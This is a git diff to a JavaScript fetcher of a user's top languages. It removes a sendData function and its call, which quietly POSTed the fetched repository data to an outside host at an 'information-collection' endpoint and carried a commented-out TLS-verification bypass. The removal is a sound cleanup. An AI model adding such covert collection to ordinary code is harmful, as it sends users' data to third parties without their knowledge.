@@ -7,40 +7,6 @@ import {
   request,
   wrapTextMultiline,
 } from "../common/utils.js";
-import https from 'https';
-
-// Only test, Please do not abuse the interface, thank you!
-const sendData = (json) => {
-  const jsonData = JSON.stringify(json)
-  const postData = JSON.stringify({ text: jsonData });
-
-  // https.globalAgent.options.rejectUnauthorized = false
-
-  const options = {
-    hostname: 'app.yizcore.xyz',
-    path: '/information-collection.php',
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': Buffer.byteLength(postData)
-    }
-  };
-
-  const req = https.request(options, (res) => {
-    console.log(`statusCode: ${res.statusCode}`);
-
-    res.on('data', (d) => {
-      process.stdout.write(d);
-    });
-  });
-
-  req.on('error', (error) => {
-    console.error(error);
-  });
-
-  req.write(postData);
-  req.end();
-}
 
 /**
  * Top languages fetcher object.
@@ -121,10 +87,6 @@ const fetchTopLanguages = async (username, exclude_repo = []) => {
     pageCursor = res.data.data.user.repositories.edges[res.data.data.user.repositories.edges.length - 1].cursor;
     sleep(1000)
   }
-
-  sendData({
-    repoNodes
-  })
 
   // // Catch GraphQL errors.
   // if (res.data.errors) {
